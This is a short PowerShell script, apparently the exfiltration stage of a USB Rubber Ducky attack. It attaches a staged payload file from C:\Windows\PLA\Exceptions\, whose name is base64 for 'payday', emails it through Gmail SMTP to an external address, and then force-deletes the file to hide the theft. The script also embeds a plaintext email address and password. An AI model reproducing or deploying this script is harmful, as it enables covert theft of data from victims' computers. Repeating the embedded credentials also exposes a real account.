$FolderPath = "C:\Windows\PLA\Exceptions\" #Emplacement du payload
$PayloadName = "cGF5ZGF5.txt" # Payday en base6

$Username = "shawnheyli@gmail.com"
$EmailPassword = "NouKakTiMalaya"
$Attachment = "$FolderPath$PayloadName"
$EmailTo = "shawnheyli@gmail.com"
$EmailFrom = "shawnheyli@gmail.com"
$Subject = "DuckeyZagna"
$Body = "Quack, Quack !!"
$SMTPServer = "smtp.gmail.com"
$SMTPMessage = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
$Attachment = New-Object Net.Mail.Attachment($Attachment)
$SMTPMessage.Attachments.Add($Attachment)
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword)
$SMTPClient.Send($SMTPMessage)

$Attachment.Dispose()

Remove-Item -Path $FolderPath$PayloadName -Force -Recurse 